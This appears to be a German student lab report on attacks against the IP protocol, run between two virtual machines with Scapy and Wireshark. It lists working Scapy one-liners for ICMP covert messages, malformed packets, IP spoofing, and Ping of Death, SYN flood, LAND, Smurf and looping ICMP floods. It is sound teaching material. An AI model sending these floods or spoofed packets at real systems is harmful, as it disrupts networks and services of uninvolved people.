---
tags: [Praktikum, Netzwerkforensik, Scapy, IP-Angriffe]
title: Praktikum 9 - Angriffe auf das IP-Protokoll
date: 2024-12-09
---

## üéØ Zielstellung

Ziel des Praktikums war es, ein vertieftes Verst√§ndnis f√ºr IP-basierte Angriffe zu entwickeln. Dies wurde durch gezielte Paketmanipulation mit **Scapy** in einer virtuellen Laborumgebung und Analyse mittels **Wireshark** umgesetzt.

---

## üß∞ Vorbereitung

- Zwei VMs im selben Netzwerk (‚Äûnwf‚Äú):  
  - **Sender:** ForDeb-VM  
  - **Empf√§nger:** Klon als Target-VM  
- IPs wurden notiert und Wireshark gestartet:  
```bash
  wireshark -k -i enp0s3
```

## üêç Einf√ºhrung in Scapy

Scapy ist ein interaktives Python-Tool zur Erstellung und Analyse von Netzwerkpaketen.

Beispiele:
#### Start Scapy
```bash
sudo scapy

#### IPs definieren
srcIP = "192.168.x.x"
dstIP = "192.168.x.y"

# Einfaches IP-Paket + Ping
ip = IP(src=srcIP, dst=dstIP)
ping = ip/ICMP()
pong = sr1(ping)
```
 vergleich mit normalen Ping:
```bash
 ping -c 1 <TargetIP>
```

## üß™ Experimente mit Paketmanipulation

Beispiele f√ºr Angriffs-Simulationen:

- **Covered Channel / ICMP Tunneling**  
    Versteckte Nachricht im ICMP-Paket:
```python
send(ip/ICMP()/"Before was was was is.")
```
- Fehlerhafte IP-Version (Malformed Ping):
```python
send(IP(src=srcIP, dst=dstIP, version=3)/ICMP())
```

#### üí£ Angriffssimulationen mit Scapy

| Angriff           | Beschreibung                             | Beispiel                                                             |
| ----------------- | ---------------------------------------- | -------------------------------------------------------------------- |
| **Ping of Death** | Fragmentiertes Paket mit zu gro√üer L√§nge | `send(fragment(ip/ICMP()/("X"*65536)))`                              |
| **IP Spoofing**   | Gef√§lschte Quell-IP                      | `send(IP(src="192.168.42.1", dst=dstIP)/ICMP())`                     |
| **ICMP-Nuke**     | Gef√§lschte ICMP-Nachrichten im Loop      | `send(IP(src="192.168.42.1", dst=dstIP)/ICMP(type=3), loop=1)`       |
| **SYN Flooding**  | DoS-Angriff mit vielen SYNs              | `send(ip/TCP(sport=RandShort(), dport=[22, 80], flags="S"), loop=1)` |
| **LAND Attack**   | DoS durch Verbindung zu sich selbst      | `send(IP(src=dstIP, dst=dstIP)/TCP(sport=80, dport=80))`             |
| **Smurf-Attack**  | ICMP an Broadcast-Adresse                | `send(IP(src=dstIP, dst="192.168.42.255")/ICMP())`                   |


